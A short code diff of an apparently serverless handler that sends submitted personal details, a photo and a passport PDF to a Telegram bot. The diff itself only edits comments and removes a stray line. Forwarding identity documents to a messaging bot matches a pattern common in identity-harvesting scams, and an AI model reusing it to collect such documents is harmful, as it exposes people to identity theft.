@@ -15,14 +15,14 @@ Passport: ${body.passport}
 Country: ${body.country}
 `;
 
-  // 1. Send text
+  // Send text
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({ chat_id, text })
   });
 
-  // 2. Send photo (base64)
+  // Send photo
   if (body.photo) {
     let form = new FormData();
     form.append("chat_id", chat_id);
@@ -36,7 +36,7 @@ Country: ${body.country}
     });
   }
 
-  // 3. Send PDF
+  // Send PDF
   if (body.passportFile) {
     let form = new FormData();
     form.append("chat_id", chat_id);
@@ -49,7 +49,7 @@ Country: ${body.country}
       body: form
     });
   }
-const body = event.body ? JSON.parse(event.body) : {};
+
   return {
     statusCode: 200,
     body: "All sent"
